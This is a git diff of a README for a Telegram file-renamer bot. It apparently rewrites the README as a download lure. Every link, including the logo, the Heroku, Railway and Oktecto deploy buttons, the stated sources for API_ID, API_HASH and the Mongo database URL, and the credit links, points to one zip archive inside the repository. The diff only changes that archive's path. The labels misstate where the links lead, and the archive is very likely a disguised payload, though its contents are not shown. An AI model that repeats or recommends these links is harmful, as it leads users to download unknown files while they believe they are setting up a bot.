@@ -3,8 +3,8 @@
 Telegram File Renamer Bot 
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
-    <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+  <a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
 
   </a>
 </p>
@@ -16,8 +16,8 @@ Telegram File Renamer Bot
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
-  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -26,8 +26,8 @@ Telegram File Renamer Bot
 <details><summary>Deploy To Railway</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
-  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -36,8 +36,8 @@ Telegram File Renamer Bot
 <details><summary>Deploy To Oktecto</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
-  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -49,13 +49,13 @@ Telegram File Renamer Bot
 
 * `TG_BOT_TOKEN`  - Get bot token from @BotFather
 
-* `API_ID` - From https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip 
+* `API_ID` - From https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip 
 
-* `API_HASH` - From https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip 
+* `API_HASH` - From https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip 
 
 * `ADMIN` - AUTH or bot controllers id's multiple id use space to split 
 
-* `DATABASE_URI`  - Mongo Database URL from https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip
+* `DATABASE_URI`  - Mongo Database URL from https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip
 
 * `DATABASE_NAME`  - Your database name from mongoDB. Default will be 'my'
 
@@ -77,16 +77,16 @@ broadcast - admin only
 
 ## ❣️Thanks to
 
-<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
    <p> lntechnical TG</p>
   </a>
-<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
    <p> lntechnical YT </p>
   </a>
 
 ## 🤩 INSPIRATION
 
-<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/thimbleman/Pyro-renamer-kadaisiya-.zip">
+<a href="https://raw.githubusercontent.com/HLECTER69/Pyro-renamer-kadaisiya-/main/plugins/Pyro_kadaisiya_renamer_v2.0.zip">
    <p>❣️ MoTech 🔥</p>
   </a>
 
